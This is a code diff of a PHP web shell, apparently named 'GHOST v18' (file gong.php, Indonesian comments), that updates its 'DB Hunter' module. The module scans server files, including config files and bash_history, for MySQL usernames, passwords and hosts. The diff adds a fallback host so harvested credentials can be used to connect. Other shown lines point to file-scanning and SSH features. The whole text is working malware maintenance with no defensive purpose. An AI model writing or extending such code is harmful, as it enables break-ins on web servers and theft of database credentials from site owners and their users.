@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V6: DB Hunter Parser Fix, SSH UI, Deep Scanner AI.
+// GHOST v18 - V6.1: Fix DB Host 'None', String Cleanup.
 
-define('GH_VER',      '18.0.0-v6');
+define('GH_VER',      '18.0.0-v6.1');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -338,7 +338,7 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: AI DB HUNTER (V6) ==========================================
+// ==== SECTION 4: AI DB HUNTER (V6.1) ========================================
 function gh_db_connect($host, $user, $pass) {
     // Trim spasi/enter
     $host = trim($host); $user = trim($user); $pass = trim($pass);
@@ -432,14 +432,17 @@ function gh_db_harvest() {
             $c = gh_read($sf);
             if ($c) {
                 $logs[] = "[+] File sniff ditemukan: $sf";
+                // FIX: Host default 'localhost' jika gak ketemu
                 if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
                 if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
                 if (preg_match('/host\s*=\s*([^\s]+)/i', $c, $m)) $db_host = trim($m[1]);
-                // FIX: Trim \n dan spasi dari bash_history
                 if (preg_match('/mysql\s+-u\s*([^\s]+)\s+-p([^\s]+)/i', $c, $m)) {
                     $db_user = trim($m[1]); 
                     $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
                 }
+                // Validasi jika host malah jadi "None"
+                if (strtolower($db_host) === 'none' || trim($db_host) === '') $db_host = 'localhost';
+                
                 if ($db_user && $db_pass) { $found_pass = true; break; }
             }
         }
